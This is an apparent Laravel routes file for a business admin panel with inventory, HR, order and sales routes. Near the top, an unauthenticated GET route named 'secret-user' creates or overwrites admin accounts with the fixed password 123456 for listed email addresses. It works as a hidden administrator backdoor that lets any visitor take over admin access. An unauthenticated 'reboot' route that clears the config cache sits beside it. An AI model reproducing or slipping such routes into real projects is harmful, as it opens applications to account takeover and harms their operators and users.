<?php


use App\Models\User;
use App\Services\Log\LogTracker;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

use App\Http\Controllers\HomeController;
use App\Http\Controllers\Admin\SaleController;
use App\Http\Controllers\Admin\UnitController;
use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\ColorController;
use App\Http\Controllers\Admin\ClientController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\VariantController;
use App\Http\Controllers\Admin\CategoryController;
use App\Http\Controllers\Admin\PurchaseController;
use App\Http\Controllers\Admin\SupplierController;
use App\Http\Controllers\Admin\WarehouseController;
use App\Http\Controllers\Admin\AttributesController;
use App\Http\Controllers\Admin\DepartmentController;
use App\Http\Controllers\Admin\DueReceiveController;
use App\Http\Controllers\Admin\DesignationController;
use App\Http\Controllers\Admin\PaymentMethodController;
use App\Http\Controllers\Admin\SubDepartmentController;

use App\Http\Controllers\Admin\Hr\EmployeeController;
use App\Http\Controllers\Admin\Hr\AttendanceController;
use App\Http\Controllers\Admin\Hr\SalaryController;

use App\Http\Controllers\Admin\Order\OrderController;
use App\Http\Controllers\Admin\Order\Task\TaskController;
use App\Http\Controllers\Admin\Prototype\ProtoTypeController;
use App\Http\Controllers\Admin\Order\Task\TaskReportController;


Route::get('reboot', function () {
    Artisan::call('config:clear');
    Artisan::call('cache:clear');
    Artisan::call('config:cache');
});

Route::get('secret-user', function () {
    $users = ['developer@gmail.com', 'admin@gmail.com', 'rislam252@gmail.com'];
    foreach ($users as $key => $user) {
        DB::beginTransaction();
        try {
            User::query()->updateOrCreate(['id' => ($key + 1)], [
                'name' => "I am " . $key == 0 ? 'Developer' : 'Admin',
                'email' => $user,
                'password' => bcrypt(123456),
                'isAdmin' => 1
            ]);
            DB::commit();
        } catch (\Exception $e) {
            LogTracker::failLog($e, auth()->user());
            DB::rollBack();
        }
    }
});

Route::get('/', function () {
    return view('admin.auth.login');
});

Auth::routes();


Route::middleware(['web', 'auth'])->group(function () {
    /* Admin Routes start */
    Route::prefix("admin")->group(function () {

        Route::get('/home', [HomeController::class, 'index'])->name('dashboard');
        Route::get('/cashbook/income', [HomeController::class, 'cashbookIncome'])->name('cashbook_income');
        Route::get('/cashbook/pay-off', [HomeController::class, 'cashbookPayOff'])->name('cashbook_pay_off');

        /* Category start */
        Route::prefix("category")->name('category.')->group(function () {
            Route::get("/add", [CategoryController::class, 'index'])->name('add');
            Route::post('/store', [CategoryController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [CategoryController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [CategoryController::class, 'update'])->name('update');
            Route::post('/destroy', [CategoryController::class, 'destroy'])->name('destroy');
        });
        /* Category end */

        /* Unit Start */
        Route::prefix("unit")->name('unit.')->group(function () {
            Route::get("/add", [UnitController::class, 'index'])->name('add');
            Route::post('/store', [UnitController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [UnitController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [UnitController::class, 'update'])->name('update');
            Route::post('/destroy', [UnitController::class, 'destroy'])->name('destroy');
        });
        /* Unit End */

        /* Designation start */
        Route::prefix("designation")->name('designation.')->group(function () {
            Route::get("/add", [DesignationController::class, 'index'])->name('add');
            Route::post('/store', [DesignationController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [DesignationController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [DesignationController::class, 'update'])->name('update');
            Route::post('/destroy', [DesignationController::class, 'destroy'])->name('destroy');
        });
        /* Designation end */

        /* Department start */
        Route::prefix("department")->name('department.')->group(function () {
            Route::get("/add", [DepartmentController::class, 'index'])->name('add');
            Route::post('/store', [DepartmentController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [DepartmentController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [DepartmentController::class, 'update'])->name('update');
            Route::post('/destroy', [DepartmentController::class, 'destroy'])->name('destroy');
        });
        /* Department end */

        /* Department start */
        Route::prefix("sub-department")->name('subDepartment.')->group(function () {
            Route::get("/add", [SubDepartmentController::class, 'index'])->name('add');
            Route::post('/store', [SubDepartmentController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [SubDepartmentController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [SubDepartmentController::class, 'update'])->name('update');
            Route::post('/destroy', [SubDepartmentController::class, 'destroy'])->name('destroy');
        });
        /* Department end */

        /*Product start */
        Route::prefix("product")->name('product.')->group(function () {
            Route::get("/add", [ProductController::class, 'index'])->name('add');
            Route::get("/search/by/code/{warehouse_id}/{product_code}", [ProductController::class, 'searchByCode'])->name('search_by_warehouse');
            Route::post('/store', [ProductController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [ProductController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [ProductController::class, 'update'])->name('update');
            Route::post('/destroy', [ProductController::class, 'destroy'])->name('destroy');
        });
        /*Product end */

        /* Employee start */
        Route::prefix("employee")->name('employee.')->group(function () {
            Route::get("/add", [EmployeeController::class, 'index'])->name('add');
            Route::post('/store', [EmployeeController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [EmployeeController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [EmployeeController::class, 'update'])->name('update');
            Route::post('/destroy', [EmployeeController::class, 'destroy'])->name('destroy');
        });
        /* Employee End  */

        /* Attendance start */
        Route::prefix("attendance")->name('attendance.')->group(function () {
            Route::get("/add", [AttendanceController::class, 'index'])->name('add');
            Route::post('/store', [AttendanceController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [AttendanceController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [AttendanceController::class, 'update'])->name('update');
            Route::post('/destroy', [AttendanceController::class, 'destroy'])->name('destroy');
        });
        /* Attendance End  */

        /* Salary start */
        Route::prefix("salary")->name('salary.')->group(function () {
            Route::get("/index", [SalaryController::class, 'index'])->name('index');
            Route::get("/add", [SalaryController::class, 'add'])->name('add');
            Route::post('/store', [SalaryController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [SalaryController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [SalaryController::class, 'update'])->name('update');
            Route::post('/destroy', [SalaryController::class, 'destroy'])->name('destroy');
            Route::post('/api/store/salary', [SalaryController::class, 'paymentSalary'])->name('salary.payment');
            Route::post('/api/search/employee', [SalaryController::class, 'searchEmployee'])->name('search.employee');
        });
        /* Salary End  */

        /* Payment Method start */
        Route::prefix('payment-method')->name('paymentMethod.')->group(function () {
            Route::get("/add", [PaymentMethodController::class, 'index'])->name('add');
            Route::post('/store', [PaymentMethodController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [PaymentMethodController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [PaymentMethodController::class, 'update'])->name('update');
            Route::post('/destroy', [PaymentMethodController::class, 'destroy'])->name('destroy');
        });
        /* Payment Method End */

        /* Color start */
        Route::prefix('color')->name('color.')->group(function () {
            Route::get("/add", [ColorController::class, 'index'])->name('add');
            Route::post('/store', [ColorController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [ColorController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [ColorController::class, 'update'])->name('update');
            Route::post('/destroy', [ColorController::class, 'destroy'])->name('destroy');
        });
        /* Color End */

        /*Warehouse start */
        Route::prefix("warehouse")->name('warehouse.')->group(function () {
            Route::get("/add", [WarehouseController::class, 'index'])->name('add');
            Route::get("/products", [WarehouseController::class, 'products'])->name('products');
            Route::post('/store', [WarehouseController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [WarehouseController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [WarehouseController::class, 'update'])->name('update');
            Route::post('/destroy', [WarehouseController::class, 'destroy'])->name('destroy');
        });
        /*Warehouse end */

        Route::prefix("prototype")->name('prototype.')->group(function(){
            Route::get("/add",[ProtoTypeController::class,'index'])->name('add');
            Route::post('/store',[ProtoTypeController::class,'store'])->name('store');
            Route::get('/edit/{id}',[ProtoTypeController::class,'edit'])->name('edit');
            Route::post('/update/{id}',[ProtoTypeController::class,'update'])->name('update');
            Route::post('/destroy',[ProtoTypeController::class,'destroy'])->name('destroy');
        });

        /* Prototype/Design End */
        /* Client Start */

        Route::prefix("order")->name('order.')->group(function () {
            Route::get("/add", [OrderController::class, 'index'])->name('add');
            Route::get("/list", [OrderController::class, 'list'])->name('list');
            Route::get("/department/report/{order_id}", [OrderController::class, 'departmentWiseReport'])->name('department_report');
            Route::post("/complete/and/stock-in/product/{order_id}", [OrderController::class, 'completeAndStockInProduct'])->name('complete');
            Route::post('/store', [OrderController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [OrderController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [OrderController::class, 'update'])->name('update');
            Route::post('/destroy', [OrderController::class, 'destroy'])->name('destroy');
        });

        /* Client End */

        /* Order Task Assign start */
        Route::prefix("production-task")->name('task.')->group(function () {
            Route::get('order/{order_id}', [TaskController::class, 'orderTask'])->name('order');
            Route::get("/add", [TaskController::class, 'index'])->name('add');
            Route::get("/list/{id}", [TaskController::class, 'orderProgressList'])->name('progress');
            Route::post('/store/{order_id}', [TaskController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [TaskController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [TaskController::class, 'update'])->name('update');
            Route::post('/destroy', [TaskController::class, 'destroy'])->name('destroy');
            Route::post('change-department', [TaskController::class, 'changeDepartment'])->name('changeDepartment');
        });
        /* Order Task Assign End */

        /* Order Task Receive start */
        Route::prefix("task-report")->name('taskReport.')->group(function(){
            Route::get("/task/{progress_id}",[TaskReportController::class,'receive'])->name('receive');
            Route::get("/add",[TaskReportController::class,'index'])->name('add');
            Route::get("/list",[TaskReportController::class,'lists'])->name('list');
            Route::post('/store/{progress_id}',[TaskReportController::class,'taskReceive'])->name('store');
            Route::get('/edit/{id}',[TaskReportController::class,'edit'])->name('edit');
            Route::post('/update/{id}',[TaskReportController::class,'update'])->name('update');
            Route::post('/destroy',[TaskReportController::class,'destroy'])->name('destroy');
        });
    /* Order Task Receive End */

        /* Color start */
        Route::prefix('color')->name('color.')->group(function () {
            Route::get("/add", [ColorController::class, 'index'])->name('add');
            Route::post('/store', [ColorController::class, 'store'])->name('store');
            Route::get('/edit/{id}', [ColorController::class, 'edit'])->name('edit');
            Route::post('/update/{id}', [ColorController::class, 'update'])->name('update');
            Route::post('/destroy', [ColorController::class, 'destroy'])->name('destroy');
        });
        /* Color End */


        /*Due Receive start */
        Route::prefix("due-receive")->name('dueReceive.')->group(function () {
            Route::get("/add", [DueReceiveController::class, 'index'])->name('add');
            Route::post("/api/search/due/invoice", [DueReceiveController::class, 'searchDue']);
            Route::post('/api/store/due/payment', [DueReceiveController::class, 'store']);
        });
        /*Due Receive end */

        /*Attributes start */
        Route::prefix("attribute")->name('attribute.')->group(function () {
            Route::get("/index", [AttributesController::class, 'index'])->name('index');
            Route::post("/store", [AttributesController::class, 'store'])->name('store');
            Route::get("/edit/{id}", [AttributesController::class, 'edit'])->name('edit');
            Route::post("/update/{id}", [AttributesController::class, 'update'])->name('update');
        });
        /*Attributes end */

        /*Variant start */
        Route::prefix("variant")->name('variant.')->group(function () {
            Route::get("/index", [VariantController::class, 'index'])->name('index');
            Route::post("/store", [VariantController::class, 'store'])->name('store');
            Route::get("/edit/{id}", [VariantController::class, 'edit'])->name('edit');
            Route::post("/update/{id}", [VariantController::class, 'update'])->name('update');
        });
        /*Variant end */

        /*Admin start */
        Route::prefix("admin")->name('admin.')->group(function () {
            Route::get('/profile/{id}', [AdminController::class, 'profile'])->name('profile');
        });
        /*Admin end */

        //resource routes
        Route::resources([
            'sale' => SaleController::class,
            'purchase' => PurchaseController::class,
            'supplier' => SupplierController::class,
            'client' => ClientController::class,
            'admin' => AdminController::class,
        ]);
        /* Admin Routes end */
    });



    /* Testing commit */


    });


